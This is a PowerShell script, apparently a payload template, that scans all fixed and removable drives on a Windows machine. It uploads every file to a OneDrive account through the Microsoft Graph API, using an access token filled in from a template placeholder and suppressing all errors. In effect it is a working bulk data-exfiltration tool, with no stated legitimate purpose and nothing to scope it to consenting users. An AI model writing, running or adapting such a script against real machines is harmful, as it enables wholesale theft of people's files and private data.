$ACCESS_TOKEN = "{{ACCESS_TOKEN}}"
$ONEDRIVE_FOLDER = "{{FOLDER}}"
$CHUNK_SIZE = 5242880
$global:totalFiles = 0
$global:uploadedFiles = 0
$global:failedFiles = 0

function Upload-File($localFile, $rootPath) {
    try {
        $fileSize = (Get-Item $localFile).Length
        $relativePath = $localFile.Substring($rootPath.Length).Replace("\\", "/")
        if ($relativePath.StartsWith("/")) {
            $relativePath = $relativePath.Substring(1)
        }
        if ($ONEDRIVE_FOLDER -and $ONEDRIVE_FOLDER -ne "") {
            $oneDrivePath = $ONEDRIVE_FOLDER + "/" + $relativePath
        } else {
            $oneDrivePath = $relativePath
        }
        $oneDrivePath = $oneDrivePath -replace "//", "/"
        if ($oneDrivePath.EndsWith("/")) {
            $oneDrivePath = $oneDrivePath.Substring(0, $oneDrivePath.Length - 1)
        }
        $folderPath = ""
        if ($oneDrivePath.Contains("/")) {
            $folderPath = $oneDrivePath.Substring(0, $oneDrivePath.LastIndexOf("/"))
        }
        if ($folderPath -and $folderPath -ne "") {
            Create-Folder $folderPath
        }
        if ($fileSize -gt 4MB) {
            Upload-LargeFile $localFile $oneDrivePath
        } else {
            Upload-SmallFile $localFile $oneDrivePath
        }
    }
    catch {
        $global:failedFiles++
        $fileName = Split-Path $localFile -Leaf
        Write-Host "Uploaded: $fileName - Failed"
    }
}

function Upload-SmallFile($localFile, $oneDrivePath) {
    try {
        $fileName = Split-Path $localFile -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($localFile)
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type" = "application/octet-stream"
        }
        $encodedPath = [System.Web.HttpUtility]::UrlEncode($oneDrivePath)
        $uri = "https://graph.microsoft.com/v1.0/me/drive/root:/${encodedPath}:/content"
        Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -Body $fileBytes | Out-Null
        $global:uploadedFiles++
        Write-Host "Uploaded: $fileName - Success"
    }
    catch {
        $global:failedFiles++
        $fileName = Split-Path $localFile -Leaf
        Write-Host "Uploaded: $fileName - Failed"
    }
}

function Upload-LargeFile($localFile, $oneDrivePath) {
    try {
        $fileName = Split-Path $localFile -Leaf
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type" = "application/json"
        }
        $encodedPath = [System.Web.HttpUtility]::UrlEncode($oneDrivePath)
        $uri = "https://graph.microsoft.com/v1.0/me/drive/root:/${encodedPath}:/createUploadSession"
        $response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body '{}'
        $uploadUrl = $response.uploadUrl
        $fileSize = (Get-Item $localFile).Length
        $stream = [System.IO.File]::OpenRead($localFile)
        $offset = 0
        $buffer = New-Object byte[] $CHUNK_SIZE
        while ($true) {
            $bytesRead = $stream.Read($buffer, 0, $CHUNK_SIZE)
            if ($bytesRead -eq 0) { break }
            $chunk = $buffer[0..($bytesRead-1)]
            $endOffset = $offset + $bytesRead - 1
            $chunkHeaders = @{
                "Content-Length" = $bytesRead.ToString()
                "Content-Range" = "bytes $offset-$endOffset/$fileSize"
            }
            Invoke-RestMethod -Uri $uploadUrl -Method Put -Headers $chunkHeaders -Body $chunk | Out-Null
            $offset += $bytesRead
        }
        $stream.Close()
        $global:uploadedFiles++
        Write-Host "Uploaded: $fileName - Success"
    }
    catch {
        $global:failedFiles++
        $fileName = Split-Path $localFile -Leaf
        Write-Host "Uploaded: $fileName - Failed"
    }
}

function Create-Folder($folderPath) {
    try {
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type" = "application/json"
        }
        $pathParts = $folderPath -split '/'
        $currentPath = ""
        foreach ($part in $pathParts) {
            if ($currentPath -eq "") {
                $currentPath = $part
            } else {
                $currentPath = $currentPath + "/" + $part
            }
            $encodedPath = [System.Web.HttpUtility]::UrlEncode($currentPath)
            $checkUri = "https://graph.microsoft.com/v1.0/me/drive/root:/${encodedPath}"
            try {
                Invoke-RestMethod -Uri $checkUri -Method Get -Headers $headers | Out-Null
            }
            catch {
                $parentPath = ""
                if ($currentPath.Contains("/")) {
                    $parentPath = $currentPath.Substring(0, $currentPath.LastIndexOf("/"))
                }
                $body = @{
                    name = $part
                    folder = @{}
                    "@microsoft.graph.conflictBehavior" = "rename"
                } | ConvertTo-Json
                if ($parentPath -and $parentPath -ne "") {
                    $encodedParent = [System.Web.HttpUtility]::UrlEncode($parentPath)
                    $createUri = "https://graph.microsoft.com/v1.0/me/drive/root:/${encodedParent}:/children"
                    Invoke-RestMethod -Uri $createUri -Method Post -Headers $headers -Body $body | Out-Null
                } else {
                    $createUri = "https://graph.microsoft.com/v1.0/me/drive/root/children"
                    Invoke-RestMethod -Uri $createUri -Method Post -Headers $headers -Body $body | Out-Null
                }
            }
        }
    }
    catch {
    }
}

function Scan-And-Upload($currentPath) {
    try {
        $items = Get-ChildItem -Path $currentPath -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            if ($item.PSIsContainer) {
                Scan-And-Upload $item.FullName
            } else {
                $global:totalFiles++
                Upload-File $item.FullName $currentPath
            }
        }
    }
    catch {
    }
}

$logicalDisks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -or $_.DriveType -eq 2 }
foreach ($disk in $logicalDisks) {
    $driveRoot = $disk.DeviceID + "\\"
    if (Test-Path $driveRoot) {
        Scan-And-Upload $driveRoot
    }
}
Write-Host "`nTotal files found: $($global:totalFiles)"
Write-Host "Successfully uploaded: $($global:uploadedFiles)"
Write-Host "Failed: $($global:failedFiles)"
